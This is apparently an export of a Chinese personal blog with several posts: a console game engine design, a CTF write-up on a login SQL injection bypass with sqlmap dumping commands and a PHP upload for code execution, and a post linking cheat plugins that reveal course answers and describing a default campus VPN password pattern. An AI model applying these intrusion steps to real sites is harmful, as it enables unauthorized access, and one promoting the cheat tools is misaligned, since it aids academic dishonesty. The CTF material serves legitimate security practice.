<p>在高一的时候，我也很自然的想过写其他的游戏，想写一个像马里奥那样的横版跳跃游戏。命令行上显示的字符就是字符，我没有办法读取到命令行上某个坐标到字符，再做一些操作，我只能把它们全部储存下来。所以一开始的思路是，分成四层，每层的数据用数组储存起来，编号层，颜色层，字符层，属性层。每一帧都刷新整个屏幕，刷新的够快，就能看到连续的画面。然而，，并不行，刷新速率没有那么快。</p>
<p>时间流转，我从高中毕业，步入大学。学长给的课程设计清单里有一个难度最高的 “七巧板”。我又想起了以前没写出的那个东西，如果我当时写出来，“七巧板”简直不存在难度。因为一些原因，最后我并没有写“七巧板”，但是这件事我还一直记着。它并不是写不出来，高一的时候我就已经想到解决办法了，只不过实在太懒，没有动手去实现。</p>
<p>2020年，新冠疫情让我有了大把的空闲时间，我终于把它写出来了。InfantGameEngine，婴儿级游戏引擎，虽然它只能显示简单的游戏画面。但它可以支持你写非常复杂的游戏逻辑。</p>
<p>=======================================================</p>
<p>Tip：源码已经放在github上了，建议参照源码阅读～</p>
<p>项目地址：<a href="https://github.com/TOXICAKE/InfantGameEngine.git" target="_blank" rel="noopener">https://github.com/TOXICAKE/InfantGameEngine.git</a></p>
<p>觉得有趣的话记得给一颗星XD</p>
<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="储存字符"><a href="#储存字符" class="headerlink" title="储存字符"></a>储存字符</h2><p>显示在屏幕上的每一个字符都具有多个属性，所以可以用结构体来记录每一个字符。借用valve公司的hammer地图编辑器里的<strong>实体(Entity)</strong>概念，每一个字符都是Entity类的实例，称作一个实体，然后用链式结构关联每一个实体。这样只需要遍历就可以取到所有的实体，以及它们其中的数据。</p>
<h2 id="刷新机制"><a href="#刷新机制" class="headerlink" title="刷新机制"></a>刷新机制</h2><p>每帧都刷新显示所有字符是不可能的，所以应该采用局部刷新的方法。假如一个实体向右移动一格，那么就是在右侧输出这个实体的字符，并在原来的位置上输出被遮挡的字符。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81.png" data-fancybox="group" data-caption="局部刷新机制" class="fancybox"><img alt="局部刷新机制" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81.png" class="lazyload" title="局部刷新机制"></a></p>
<h2 id="碰撞机制"><a href="#碰撞机制" class="headerlink" title="碰撞机制"></a>碰撞机制</h2><p>实体应该具有一个参数<strong>碰撞(Collision)</strong>，两个有碰撞实体彼此不能穿过，两个实体间如果有至少一方是无碰撞的则它们彼此可以穿过。这就是基本的碰撞机制。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%202.png" data-fancybox="group" data-caption="简单演示一下碰撞机制" class="fancybox"><img alt="简单演示一下碰撞机制" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%202.png" class="lazyload" title="简单演示一下碰撞机制"></a></p>
<h2 id="实体组"><a href="#实体组" class="headerlink" title="实体组"></a>实体组</h2><p>显然，我们不能总是让开发者以实体为单位去开发游戏，例如马里奥是32*32像素的，程序移动马里奥是以整个马里奥为单位去移动的，我们也应该向开发者提供以组为单位的开发方式。我选用了二级链表来实现，即实体组之间连接，每个节点又是新的实体链的头节点。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%203.png" data-fancybox="group" data-caption="实体组的数据结构" class="fancybox"><img alt="实体组的数据结构" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%203.png" class="lazyload" title="实体组的数据结构"></a></p>
<h1 id="交付"><a href="#交付" class="headerlink" title="交付"></a>交付</h1><p>为了使游戏显示效果尽可能的好，刷新应该在移动后进行，所以刷新应该交付给各个会产生实体位置移动的函数。</p>
<p>碰撞检查也是发生在移动过程中的，也应该交付给各个会产生实体位置移动的函数。</p>
<p>实体移动到新位置时，应该要把新位置上的实体保存下来（如果有）。但除了在移动时要保存，在创建新实体时也要保存。</p>
<h1 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h1><h2 id="实体移动-En-Move"><a href="#实体移动-En-Move" class="headerlink" title="实体移动 En_Move"></a>实体移动 En_Move</h2><p>实体的移动是引擎最基本的功能，包括的内容很多，但是逻辑并不复杂。接受的参数应该是实体的编号（id），运动方向（direction)，距离(distance)。</p>
<p>首先是检查对应方向上的可移动距离。如果移动的实体本身的碰撞属性是off，则不需要考虑与其他实体的碰撞问题，只用检查移动完是否在画布内即可。如果碰撞属性是on，则循环检查时就要同时考虑检查位置上的实体碰撞属性，如果同为on，则可移动距离就是到这个实体的距离。</p>
<p>计算出可移动距离，如果比distance大，则可以移动distance那么远，否则的话移动到最大可移动距离停下。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%204.png" data-fancybox="group" data-caption="实体移动演示" class="fancybox"><img alt="实体移动演示" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%204.png" class="lazyload" title="实体移动演示"></a></p>
<h2 id="构成实体组-AddEnToGr"><a href="#构成实体组-AddEnToGr" class="headerlink" title="构成实体组 AddEnToGr"></a>构成实体组 AddEnToGr</h2><p>实例化一个实体组对象后，使用这个函数将一个实体加入到组中去，代码也很简单，就是普通的在实体链后面加一个节点而已。</p>
<h2 id="实体组移动-Gr-Move"><a href="#实体组移动-Gr-Move" class="headerlink" title="实体组移动 Gr_Move"></a>实体组移动 Gr_Move</h2><p>实体组的移动其实就是对每个实体进行实体移动而已，但实际上的代码逻辑要稍微复杂一点。</p>
<p>首先循环计算每一个组内实体的可移动距离，再求出其中的最小值。这个最小值就是这个实体组实际上可以移动的距离。<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%205.png" data-fancybox="group" data-caption="实体组移动演示" class="fancybox"><img alt="实体组移动演示" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%205.png" class="lazyload" title="实体组移动演示"></a></p>
<p>但是，如果之间调用之前写好的实体移动函数则会出现刷新显示上的问题。</p>
<p>因为是顺序结构，所以实体组中的实体也是按序移动，顺序与每条AddEnToGr执行顺序一致，这样就导致如果显示位置在前（沿移动方向）的实体移动顺序排在后面，就会遮挡先前移动好的实体。如下图所示，按ABC顺序添加进组中的三个实体，向右移动一格，最后画面上只会剩下C。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%206.png" data-fancybox="group" data-caption="bug" class="fancybox"><img alt="bug" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%9C%AA%E5%91%BD%E5%90%8D%E4%BD%9C%E5%93%81%206.png" class="lazyload" title="bug"></a></p>
<p>解决办法就是等所有实体移动完后再刷新遮挡的实体，最后刷新移动后的实体。</p>
<h2 id="实体组旋转-Gr-Spin"><a href="#实体组旋转-Gr-Spin" class="headerlink" title="实体组旋转 Gr_Spin"></a>实体组旋转 Gr_Spin</h2><p>旋转也应该是引擎提供的功能。开发者提供旋转中心和旋转方向，就可以直接以组为单位旋转。可以简单的分为几步来实现，计算所有实体旋转后应该在的位置，然后检查移动路径上是否有阻碍，如果有，则不能旋转。确定旋转后位置的算法，（我用象棋棋盘找到的，并不复杂）。在算法上，第一步是确定实体所在的象限，再在象限内判断实体在45度线的那半边。还有特殊的实体恰好在分界线上的情况。下图是我的演草纸，动手画图找到规律就可以了。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%BC%94%E8%8D%89%E7%BA%B8.png" data-fancybox="group" data-caption="演草纸" class="fancybox"><img alt="演草纸" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%BC%94%E8%8D%89%E7%BA%B8.png" class="lazyload" title="演草纸"></a></p>
<p>这部分代码比较费神，实际上最后的代码应该可以优化，但是我已经没有心情去做了。</p>
<h1 id="API的设置"><a href="#API的设置" class="headerlink" title="API的设置"></a>API的设置</h1><p>我在开发好基本功能后就去写了小demo来测试，最后写了“七巧板”来做最终的测试，中间的api也是越加越多，除了实体的信息要有api来提供以外，总的实体数目，组的个数还有组内实体总数也都需要提供。还要可以多种方式查询，比如获得实体可以通过实体编号，也可以通过组和组内实体编号，还可以通过画布的坐标。</p>
<h1 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h1><p>它的实际使用效果很不错，因为我们在开发时提供的功能比较完善，没有过多的限制，并且是直接的api调用编程，比较灵活。</p>
<p>开发过程中最重要的是实体的管理，如果实体没有管理好，整个代码看起来就会相当糟糕。</p>
<p>实体就是“实际”存在的意思，他具体是什么由程序员的代码来决定。例如你可以在实体类中增加一个变量Key，程序员在设计游戏时就可以给key赋值，例如1代表构成主角的实体，2代表按钮，3代表门。</p>
<p>测试程序和测试源码都可以在github上找到。</p>
<p>=======================================================</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>你大概不会真的动手去写一个，上面过程可能也没有很认真的思考，可能，你会觉得它没什么用。我们是直接接触框架的一代，这些东西除了作为上学时的作业，几乎毫无用处，我们上面在讨论的东西，也是之前<strong>雅达利</strong>思考过的东西，他们当时的开发环境还要更为恶劣一些。只不过如果你做一遍，你就会发现游戏引擎是如此奇妙，而这还只是做出了40年前的水平。现在的我不过只是19级的大一新生，总是在写不会有第二个人写的东西。</p>
<p>实际上，命令行也可以做出很有趣的游戏，画面并不是游戏的唯一要素。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%88%AA%E5%B1%8F2020-04-07%20%E4%B8%8A%E5%8D%8811.10.55.png" data-fancybox="group" data-caption="大灾变：劫后余生" class="fancybox"><img alt="大灾变：劫后余生" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/InfantGameEngine/%E6%88%AA%E5%B1%8F2020-04-07%20%E4%B8%8A%E5%8D%8811.10.55.png" class="lazyload" title="大灾变：劫后余生"></a></p>
<p>当然还有著名的生命游戏。</p>
<p>谢谢你花时间阅读这篇博客。：）</p>
<p>在评论区留个脚印吧～</p>
]]></content>
      <tags>
        <tag>C++,命令行,Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 新春战疫WriteUp</title>
    <url>/2020/02/25/i%E6%98%A5%E7%A7%8B-%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB/</url>
    <content><![CDATA[<p>这次公开赛并没有怎么花时间打，总共就做出两道web。<em>（花时间也不会做）</em></p>
<p>以下是这两道题的wp</p>
<h1 id="招聘系统"><a href="#招聘系统" class="headerlink" title="招聘系统"></a>招聘系统</h1><p>可以注册一个账号进入，会发现有一个页面需要管理员权限</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204657.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204657.png" class="lazyload" title></a></p>
<p>在登录框处存在sql注入漏洞，单引号闭合后，用井号注释掉后面的语句，即可任意密码登陆管理员。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204612.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204612.png" class="lazyload" title></a>打开那个需要管理员的页面</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204802.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204802.png" class="lazyload" title></a></p>
<p>想到此处可能存在sql注入</p>
<p>加单引号和井号后页面加载时间异常</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204824.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204824.png" class="lazyload" title></a></p>
<p>很可能可以注入</p>
<p>抓个包，居然是get。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205250.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205250.png" class="lazyload" title></a></p>
<p>放进sqlmap跑一下</p>
<p><code>sqlmap -r flag.txt</code></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205444.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20205444.png" class="lazyload" title></a></p>
<p>找到变量key存在注入</p>
<p>爆个库，</p>
<p><code>sqlmap -r flag.txt --dbs</code></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210011.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210011.png" class="lazyload" title></a></p>
<p>nzhaopin应该就是flag在的库</p>
<p>再暴个表</p>
<p><code>sqlmap -r flag.txt -D nzhaopin --tables</code></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210052.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210052.png" class="lazyload" title></a></p>
<p>找到flag表</p>
<p>暴一下字段</p>
<p><code>sqlmap -r flag.txt -D nzhaopin -T flag --columns</code></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210152.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210152.png" class="lazyload" title></a></p>
<p>看到flaaag字段</p>
<p>暴flaaag字段</p>
<p><code>sqlmap -r flag.txt -D nzhaopin -T flag -C &quot;flaaag&quot; --dump</code></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210303.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20210303.png" class="lazyload" title></a></p>
<p>Get flag.</p>
<p>本题手注wp可以参考 <a href="https://www.yuque.com/r1car/tnf7vi/rp443a" target="_blank" rel="noopener">1ight师傅的wp</a></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>先随意上传一个文件，抓包</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203307.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203307.png" class="lazyload" title></a></p>
<p>把文件后缀改php，文件内容改成一段脚本，上传后访问上传到的位置。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204040.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204040.png" class="lazyload" title></a></p>
<p>发现可以执行任意代码。</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204238.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204238.png" class="lazyload" title></a></p>
<p>看到当前位置后，向后访问</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203841.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20203841.png" class="lazyload" title></a></p>
<p>最后在这个目录下找到了flag</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204317.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204317.png" class="lazyload" title></a></p>
<p>直接用cat命令读不到flag，好像flag文件本来就是空的。</p>
<p>运行readflag程序</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204354.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/i%E6%98%A5%E7%A7%8B%20%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E5%BC%80%E8%B5%9B/%E6%89%B9%E6%B3%A8%202020-02-21%20204354.png" class="lazyload" title></a></p>
<p>Get flag.</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Save My Time</title>
    <url>/2020/02/19/SaveMyTime/</url>
    <content><![CDATA[<h1 id="TamperMonkey类"><a href="#TamperMonkey类" class="headerlink" title="TamperMonkey类"></a>TamperMonkey类</h1><p>挂梯子下载谷歌插件<a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN" target="_blank" rel="noopener">Tampermonkey</a></p>
<h2 id="超星学习通，学银在线"><a href="#超星学习通，学银在线" class="headerlink" title="超星学习通，学银在线"></a>超星学习通，学银在线</h2><p>可以使用<a href="[https://greasyfork.org/zh-CN/scripts/369625-%E8%B6%85%E6%98%9F%E7%BD%91%E8%AF%BE%E5%8A%A9%E6%89%8B](https://greasyfork.org/zh-CN/scripts/369625-超星网课助手)">超星网课助手</a></p>
<p>学银在线需要在插件源码<em>UserScript</em>中添加一行</p>
<p><code>// @match        *://*.xueyinonline.com/*</code></p>
<h2 id="U校园、MOOC"><a href="#U校园、MOOC" class="headerlink" title="U校园、MOOC"></a>U校园、MOOC</h2><p>下载插件<a href="https://greasyfork.org/zh-CN/scripts/392023-u%E6%A0%A1%E5%9B%AD%E8%8B%B1%E8%AF%AD%E7%BD%91%E8%AF%BE%E7%AD%94%E6%A1%88%E6%98%BE%E7%A4%BA" target="_blank" rel="noopener">U校园答案显示</a>、<a href="https://greasyfork.org/zh-CN/scripts/396410-domooc" target="_blank" rel="noopener">MOOC自动答题</a></p>
<h1 id="优学院"><a href="#优学院" class="headerlink" title="优学院"></a>优学院</h1><p>优学院可以使用<a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/n0p3.zip" target="_blank" rel="noopener">优学院辅助插件</a></p>
<p>(已经被我改的看不出来是刷课插件了)</p>
<h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><p>这是一个谷歌浏览器插件，下载后解压得到文件夹。在谷歌浏览器插件管理中点【加载已解压的插件】选解压后的文件夹即可。</p>
<p>在网页内单击右键找到N0P3</p>
<p>获取神秘字符串即显示答案</p>
<p>填写神秘字符串即填写填空题答案</p>
<p>5x可将视频五倍速播放（这已经是不会造成卡死的最快速度了）</p>
<p>Ps：不能自动换页<em>（等我仔细分析一下源码或许能加上）</em></p>
<h1 id="访问校园网（查成绩）"><a href="#访问校园网（查成绩）" class="headerlink" title="访问校园网（查成绩）"></a>访问校园网（查成绩）</h1><p>首先下载SSLVPN</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/SSLVPN.exe" target="_blank" rel="noopener">SSLVPN</a></p>
<p>安装后第一行填<a href="https://122.207.223.254/" target="_blank" rel="noopener">https://122.207.223.254/</a> （<em>参见<a href="https://net.nyist.edu.cn/info/1047/1126.htm" target="_blank" rel="noopener">学校发布的文档</a></em>）</p>
<p>用户名填学号</p>
<p>密码是身份证后6位</p>
<p>登录成功后就可以正常访问<a href="http://222.139.215.217/jwweb/" target="_blank" rel="noopener">教务管理系统</a></p>
<h1 id="超星查看被锁课程"><a href="#超星查看被锁课程" class="headerlink" title="超星查看被锁课程"></a>超星查看被锁课程</h1><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.43.21.jpg" data-fancybox="group" data-caption="进入" class="fancybox"><img alt="进入" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.43.21.jpg" class="lazyload" title="进入"></a></p>
<p>看到第一课时被锁</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.55.18.jpg" data-fancybox="group" data-caption="点标题" class="fancybox"><img alt="点标题" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.55.18.jpg" class="lazyload" title="点标题"></a></p>
<p>进入这里预览课程</p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.58.21.jpg" data-fancybox="group" data-caption="预览" class="fancybox"><img alt="预览" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.58.21.jpg" class="lazyload" title="预览"></a></p>
<p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.59.46.png" data-fancybox="group" data-caption="ok" class="fancybox"><img alt="ok" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/SAVE%20MY%20TIME/%E6%88%AA%E5%B1%8F2020-02-20%E4%B8%8B%E5%8D%882.59.46.png" class="lazyload" title="ok"></a></p>
<p>OK 能看了。</p>
]]></content>
      <tags>
        <tag>study,cheat,easy</tag>
      </tags>
  </entry>
  <entry>
    <title>C++,Windows,XzyGraphics图形库</title>
    <url>/2020/02/10/C-Windows-XzyGraphics%E5%9B%BE%E5%BD%A2%E5%BA%93/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h1><p><strong>坐标：</strong><br>左上角为原点，x轴向右延伸，y轴向下延伸，无负坐标。<br>使用GOTOXY函数来控制光标位置。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">GOTOXY(<span class="number">1</span>,<span class="number">1</span>)<span class="comment">//控制光标至控制台左上角</span></span><br></pre></td></tr></table></figure></div>

